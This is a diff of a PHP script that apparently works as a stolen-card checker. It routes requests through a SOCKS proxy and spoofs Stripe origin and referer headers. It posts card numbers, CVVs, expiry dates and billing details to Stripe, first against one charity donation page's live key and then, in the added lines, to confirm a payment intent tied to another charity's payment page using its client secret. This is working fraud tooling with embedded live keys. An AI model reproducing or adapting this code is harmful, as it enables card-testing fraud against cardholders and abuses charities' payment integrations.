@@ -71,15 +71,15 @@ $ch = curl_init();
 // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
 ////////=========Socks Proxy
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_1GRWq8E4tYs4RDEOqHciA1ik/confirm');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: application/json',
 'accept-encoding: gzip, deflate, br', 
 'content-type: application/x-www-form-urlencoded',
-'origin: https://checkout.stripe.com',
-'referer: https://checkout.stripe.com/m/v3/index-7f66c3d8addf7af4ffc48af15300432a.html?distinct_id=8191350b-272c-b267-0b61-ce68c6fb1308',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/v3/controller-acfa331062b18d01cad8673800ca4369.html',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site'));
@@ -90,8 +90,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$email.'&validation_type=card&payment_user_agent=Stripe+Checkout+v3+checkout-manhattan+(stripe.js%2Fa44017d)&referrer=https%3A%2F%2Fwww.meath.org.uk%2Fdonate%2F&pasted_fields=number&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'&card[name]='.$name.'&time_on_page=46184&guid=c32ea8ce-7441-43c0-9448-e50fb6447e3f&muid=e58d38f0-da96-4796-959d-7d8877ebc712&sid=dc30859b-87cb-4267-a870-fdaaaf16aa5d&key=pk_live_oXvyl9ha68x1JFfbADpCjdfY00suSWJ5MA');
-
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'+'.$last.'&payment_method_data[billing_details][address][city]'.$city.'&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][line1]='.$street.'&payment_method_data[billing_details][address][line2]='.$street.'&payment_method_data[billing_details][address][postal_code]='.$postcode.'&payment_method_data[billing_details][address][state]=&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=NA&payment_method_data[muid]=2c91d784-e260-433c-af7d-f80594049566&payment_method_data[sid]=669586cf-24f5-40fb-bb4e-3e436869ecc5&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fd6141c83%3B+stripe-js-v3%2Fd6141c83&payment_method_data[time_on_page]=157083&payment_method_data[referrer]=https%3A%2F%2Fwww.firststopdarlington.org.uk%2Fpages%2Fpayment%2Fcredit-card%2F%3Fid%3D90cd168d-3b99-4c92-9350-b79e45a4e6c5%26mobile-wallet%3D0&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_kNjVS2LjGuJSPJPX1EtiZC1X&client_secret=pi_1GRWq8E4tYs4RDEOqHciA1ik_secret_1tKXFus0msHnWKbgegORn07d9');
 $result = curl_exec($ch);
 
 ///$token = trim(strip_tags(getStr($result,'"id": "','"')));
